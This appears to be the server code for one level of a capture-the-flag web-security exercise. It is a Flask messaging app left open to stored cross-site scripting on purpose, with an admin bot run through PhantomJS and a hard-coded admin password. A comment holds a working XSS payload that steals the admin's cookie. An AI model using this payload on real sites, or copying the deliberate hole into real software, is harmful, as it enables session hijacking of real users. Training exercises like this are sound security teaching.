from chew_toy_web import app
import chew_toy_web
from flask import render_template, request, session, redirect
import os
import sqlite3
import subprocess
import threading

# Hai!<script>document.forms[0].getElementsByTagName('input')[1].value = document.cookie;document.forms[0].getElementsByTagName('input')[0].value = 'guest';document.forms[0].submit();</script>

# Needs the admin account to log in and then periodically check the messages page ...
# PhantomJS?

def get_db():
    filename = 'level5_' + chew_toy_web.instance_id + '.db'
    creating = not os.path.isfile(filename)
    conn = sqlite3.connect(filename)
    if creating:
        c = conn.cursor()
        c.execute('CREATE TABLE users (username TEXT, password TEXT, admin INTEGER)')
        c.execute("INSERT INTO users VALUES ('admin', 'j6GM0bbCP8q9NQ1PotbZ1', 1)")
        c.execute("INSERT INTO users VALUES ('guest', '', 0)")
        c.execute('CREATE TABLE messages (id INTEGER PRIMARY KEY AUTOINCREMENT, "from" TEXT, "to" TEXT, message TEXT)')
        c.execute("INSERT INTO messages ('from', 'to', message) VALUES ('admin', 'admin', 'The flag is FLAG_FOR_LEVEL_5')")
        conn.commit()
    return conn

@app.route('/level5', methods=['GET'])
def level5_get():
    conn = get_db()
    c = conn.cursor()
    posted = 'posted' in request.args
    result = []
    username = session['username'] if 'username' in session else ''
    if len(username) > 0:
        for row in c.execute('SELECT * FROM messages WHERE "to" = ?', (username,)):
            result.append({ 'from': row[1], 'message': row[3] })
    return render_template('level5.html', result=result, posted=posted, username=username)

@app.route('/level5', methods=['POST'])
def level5_post():
    username = session['username'] if 'username' in session else 'guest'
    to = request.form['to']
    message = request.form['message']

    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO messages ('from', 'to', message) VALUES (?, ?, ?)", (username, to, message,))
    conn.commit()
    
    if to == 'admin':
        print('running up thread!')
        t = threading.Thread(target=sneaky_xss_trigger)
        t.daemon = True
        t.start()
    
    return redirect('/level5?posted')

@app.route('/level5/login', methods=['POST'])
def level5_login():
    username = request.form['username']
    password = request.form['password']

    conn = get_db();
    c = conn.cursor()
    c.execute('SELECT password FROM users WHERE username = ?', (username,))
    if password == c.fetchone()[0]:
        session['username'] = username
    return redirect('/level5')

def sneaky_xss_trigger():
    subprocess.run(["etc/phantomjs", "etc/level5.js", chew_toy_web.instance_id], timeout=20)
    
